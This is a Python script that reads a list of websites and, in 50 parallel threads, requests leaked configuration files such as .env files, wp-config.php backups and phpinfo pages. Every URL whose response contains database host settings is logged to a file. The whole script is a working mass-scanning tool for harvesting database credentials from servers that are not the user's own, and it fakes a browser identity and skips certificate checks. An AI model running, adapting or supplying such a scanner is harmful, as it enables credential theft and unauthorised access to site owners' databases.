import os
import sys
import requests
import time
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore, Style
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

bl = Fore.BLUE
wh = Fore.WHITE
gr = Fore.GREEN
red = Fore.RED
res = Style.RESET_ALL
yl = Fore.YELLOW

headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0'}
timeout = 10

def screen_clear():
    os.system('cls')

def lazycfg(star, config_file):
    if "://" not in star:
        star = "http://" + star
    star = star.replace('\n', '').replace('\r', '')
    url = star + config_file
    try:
        check = requests.get(url, headers=headers, timeout=timeout, verify=False)
        if check.status_code == 200:
            resp = check.text
            if "DB_HOST" in resp:
                print(f"Config {gr}OK{res} => {star}\n")
                with open("configfound.txt", "a") as f:
                    f.write(f'{url}\n')
            else:
                print(f"{red}Not Found{res} Config => {star}\n")
        else:
            print(f"{red}ERROR{res} {check.status_code} => {star}\n")
    except requests.exceptions.RequestException as e:
        print(f"{red}ERROR{res}  => {star}\n")

def filter(star):
    lazycfg(star, "/.env")
    lazycfg(star, "/wp-config.php~")
    lazycfg(star, "/wp-config.inc")
    lazycfg(star, "/wp-config.old")
    lazycfg(star, "/wp-config.php.bak")
    lazycfg(star, "/wp-config.php.dist")
    lazycfg(star, "/wp-config.php.inc")
    lazycfg(star, "/wp-config.php.old")
    lazycfg(star, "/wp-config.php.txt")
    lazycfg(star, "/wp-config.txt")
    lazycfg(star, "/phpinfo.php")
    lazycfg(star, "/php.php")
    lazycfg(star, "/info.php")
    lazycfg(star, "/inf.php")
    


def main():
    list_file = sys.argv[1]
    with open(list_file, 'r') as f:
        star = f.readlines()
    try:
        with ThreadPool(50) as pool:
            pool.map(filter, star)
    except:
        pass

if __name__ == '__main__':
    screen_clear()
    main()
